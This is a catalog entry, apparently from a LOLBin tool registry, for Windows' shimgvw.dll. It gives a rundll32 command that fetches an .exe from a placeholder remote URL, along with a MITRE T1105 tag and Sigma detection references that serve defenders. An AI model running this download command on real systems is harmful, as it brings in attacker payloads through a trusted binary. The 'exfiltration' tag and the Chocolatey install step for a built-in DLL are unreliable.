---
id: windows-download-shimgvw
namespace: windows:download:shimgvw
name: shimgvw
description: 'Photo Gallery Viewer Located at: c:\windows\system32\shimgvw.dll; c:\windows\syswow64\shimgvw.dll.'
author: Eral4m
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- shimgvw
parameters: []
features:
- network-intensive
- pipes-stdout
execution:
  template: shimgvw
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Once executed, rundll32.exe will download the file at the URL in the
    command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.
    (Download file from remote location.)
  command: rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
references:
- label: '1479080793003671557'
  url: https://twitter.com/eral4m/status/1479080793003671557
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- type: ioc
  description: Execution of rundll32.exe with 'ImageView_Fullscreen' and a protocol
    handler ('://') on the command line
install:
- method: choco
  package_name: shimgvw
  commands:
  - choco install shimgvw
---

# shimgvw

shimgvw is a Windows LOLBin. Photo Gallery Viewer Located at: c:\windows\system32\shimgvw.dll; c:\windows\syswow64\shimgvw.dll.
